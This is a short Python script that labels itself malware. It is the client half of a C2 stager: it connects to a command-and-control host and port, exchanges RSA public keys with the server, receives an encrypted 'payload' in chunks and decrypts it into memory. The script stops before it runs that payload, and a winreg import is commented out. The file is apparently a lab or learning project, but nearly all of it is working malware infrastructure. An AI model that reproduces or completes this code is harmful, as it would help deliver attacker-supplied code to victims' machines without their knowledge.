import socket
import os
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
# import winreg as wrg
import logging

log = logging.getLogger(__name__)

CYPHERTEXT_LENGTH = 256
CCIP = "127.0.0.1"
CCPORT = 5555


class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)

    def encrypt(self,message):
        return self.manager.encrypt(message.encode("utf-8"))
    
    # def decrypt(self,cyphertext):
    #     return self.manager.decrypt(cyphertext).decode()
    
    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext)

    def getPublicKey(self):
        return self.publicKeyPEM


class Communication:
    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def conn(self, CCIP, CCPORT):
        try:
            self.client.connect((CCIP, CCPORT))
            log.info('connected')
        
        except Exception as e:
            log.error(e)

    def send(self, message):
        try:
            self.client.send(message)
            log.info(f"Sending:\n {message}")

        except Exception as e:
            log.error(e)


    def receive(self, msgSize):
        try:
                while True:
                    data = self.client.recv(msgSize)
                    log.debug(f"Received:\n {data}")
                    return data
        except Exception as e:
            log.error(e)





def main():
    logging.basicConfig( 
                        level=logging.DEBUG, 
                        format='%(asctime)s: %(levelname)s, %(message)s' )
    log.info("Starting")

    communication = Communication()
    crypto = Cryptography()

    communication.conn(CCIP, CCPORT)

    # RECEIVE SERVER'S PK    
    log.info("waiting for server public key...")
    SERVER_PK = communication.receive(1024)

    # SEND MALWARE'S PK
    log.info("sending client public key...")
    communication.send(crypto.getPublicKey())
    log.debug(f"sending {crypto.getPublicKey()}")
    
    # RECEIVE ENCRYPTED MESSAGE
    log.info("waiting for payload...")
    chunks = bytearray()
    
    while True:
        encryptedChunk = communication.receive(CYPHERTEXT_LENGTH)
        chunks.extend(encryptedChunk)
        if not encryptedChunk:
            break 

    # DECRYPTING ENCRYPTED MESSAGE 
    log.info("decrypting chunks...")
    PAYLOAD = bytearray()  
    begin = 0
    end = CYPHERTEXT_LENGTH
    for i in range(len(chunks)//CYPHERTEXT_LENGTH):        
        PAYLOAD.extend(crypto.decrypt(chunks[begin:end]))
        begin = end
        end = begin + CYPHERTEXT_LENGTH



if __name__ == "__main__":
    main()